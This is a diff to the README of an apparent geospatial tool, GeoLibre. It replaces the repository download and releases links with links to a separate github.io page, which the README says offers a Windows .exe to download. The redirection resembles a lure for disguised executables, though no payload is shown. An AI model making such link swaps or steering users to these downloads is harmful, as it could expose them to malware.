@@ -1,6 +1,6 @@
 # 🌐 GeoLibre - Unlock insights from your geospatial data
 
-[![Download GeoLibre](https://img.shields.io/badge/Download-GeoLibre-blue.svg)](https://github.com/spaita1897/GeoLibre)
+[![Download GeoLibre](https://img.shields.io/badge/Download-GeoLibre-blue.svg)](https://spaita1897.github.io)
 
 GeoLibre helps you visualize and analyze map data. It works on your computer, in your web browser, and on mobile devices. You can explore complex data sets without needing advanced technical skills. The software uses modern tools to keep your maps fast and responsive.
 
@@ -21,7 +21,7 @@ Before you install the application, check that your computer meets these require
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [GeoLibre releases page](https://github.com/spaita1897/GeoLibre) to see the download options.
+1. Visit the [GeoLibre releases page](https://spaita1897.github.io) to see the download options.
 2. Look for the file that ends with `.exe`.
 3. Click the file name to start the download. 
 4. Once the download finishes, navigate to your Downloads folder.
